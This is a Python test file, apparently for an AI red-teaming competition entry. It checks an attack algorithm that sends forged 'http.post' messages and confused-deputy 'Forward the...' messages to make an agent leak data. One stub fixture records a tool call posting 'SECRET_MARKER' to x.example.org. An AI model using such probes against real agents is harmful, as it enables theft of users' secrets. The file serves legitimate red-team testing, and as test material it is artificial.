# workspace/tests/test_run.py
import itertools

from attack import (
    AttackAlgorithm, _static_fallback, _url_stream,
    MIN_LIVE_BUDGET_S, MARGIN_FRAC, MAIN_FRAC, REPLAY_SAFE_FRAC,
    REPLAY_BUDGET_S, MAX_CANDIDATES, FALLBACK_POST_N,
)
from aicomp_sdk.attacks import AttackRunConfig


class _FakeEnv:
    """Never-firing env (deterministic-like): probes miss cleanly."""

    def reset(self, *a, **k):
        pass

    def interact(self, msg, max_tool_hops=None):
        assert max_tool_hops is not None      # must always be explicit

    def export_trace_dict(self):
        return {"tool_events": [], "user_messages": [],
                "egress": [], "seed": 123}


class _ExplodingEnv:
    def reset(self, *a, **k):
        pass

    def interact(self, msg, max_tool_hops=None):
        raise RuntimeError("env dead")

    def export_trace_dict(self):
        raise AssertionError("unreachable")


def test_run_small_budget_goes_straight_to_fallback():
    result = AttackAlgorithm().run(
        _FakeEnv(), AttackRunConfig(time_budget_s=MIN_LIVE_BUDGET_S - 1))
    fb = _static_fallback()
    assert result == fb                       # identical, already finalized


def test_run_dead_env_returns_fallback_not_empty():
    result = AttackAlgorithm().run(
        _ExplodingEnv(), AttackRunConfig(time_budget_s=300))
    assert len(result) >= 1                   # never empty, never raises


def test_run_live_misses_still_fallback(monkeypatch):
    # Live env healthy but 0 fires => fallback appended so replay has body.
    # Bound the stream: 0-cost fake probes + infinite stream = busy loop
    # until edge-prune. Bound = FALLBACK_POST_N (not 20) because
    # _static_fallback also drinks from _url_stream and must stay
    # full-size; stream exhaustion ends _fill naturally with live_ok=True,
    # which is exactly the scenario under test, in milliseconds.
    import attack as attack_mod
    import itertools as _it

    real_stream = attack_mod._url_stream
    monkeypatch.setattr(
        attack_mod, "_url_stream",
        lambda: iter(_it.islice(real_stream(), FALLBACK_POST_N)))
    result = AttackAlgorithm().run(
        _FakeEnv(), AttackRunConfig(time_budget_s=300))
    assert len(result) >= 300                 # fallback body present


def test_run_search_disabled_uses_fallback():
    algo = AttackAlgorithm({"search_enabled": False})
    result = algo.run(_FakeEnv(), AttackRunConfig(time_budget_s=8750))
    assert result == _static_fallback()


def test_run_live_fires_return_posts_then_deputies(monkeypatch):
    # Hosted main path: probes fire -> validated posts first, deputies after,
    # no fallback mixed in.
    import attack as attack_mod
    import itertools as _it

    class _FiringEnv:
        def __init__(self):
            self.n = 0
        def reset(self, *a, **k):
            pass
        def interact(self, msg, max_tool_hops=None):
            assert max_tool_hops is not None
        def export_trace_dict(self):
            self.n += 1
            return {"tool_events": [
                        {"name": "http.post", "ok": True,
                         "side_effect": "SHARE", "source": "tool",
                         "args": {"url": "https://x.example.org/log",
                                  "data": "SECRET_MARKER"}}],
                    "user_messages": [], "egress": [], "seed": 123}

    real_urls = attack_mod._url_stream
    real_recips = attack_mod._recipient_stream
    monkeypatch.setattr(attack_mod, "_url_stream",
                        lambda: iter(_it.islice(real_urls(), 5)))
    monkeypatch.setattr(attack_mod, "_recipient_stream",
                        lambda: iter(_it.islice(real_recips(), 3)))
    result = AttackAlgorithm().run(_FiringEnv(), AttackRunConfig(time_budget_s=8750))
    msgs = [c.user_messages[0] for c in result]
    posts = [m for m in msgs if m.startswith("http.post url=")]
    deps = [m for m in msgs if m.startswith("Forward the")]
    assert len(posts) == 5 and len(deps) == 3          # forged-only main
    assert msgs.index(deps[-1]) > msgs.index(posts[-1])
    assert len(msgs) == 8                              # no fallback mixed in


def test_deputy_budget_is_two_percent():
    import attack as attack_mod
    assert attack_mod.MAIN_FRAC == 0.98


def test_finalize_respects_candidate_cap():
    # run() 的最后防线是 _finalize 的 2000 上限(防御性,正常路径远达不到)
    from attack import _finalize

    class _C:
        def __init__(self, i):
            self.user_messages = (f"msg {i}",)

    many = [_C(i) for i in range(3000)]
    assert len(_finalize(many)) == MAX_CANDIDATES
